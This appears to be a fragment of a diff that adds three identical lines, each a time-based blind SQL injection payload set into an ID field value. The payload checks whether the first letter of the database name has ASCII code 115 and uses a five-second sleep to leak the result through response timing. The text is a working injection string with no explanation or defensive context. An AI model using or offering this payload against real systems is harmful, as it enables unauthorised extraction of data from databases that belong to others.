@@ -1,0 +1,3 @@
+ID:1' and if(ascii(mid((select database()),1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=115,1,sleep(5))-- 
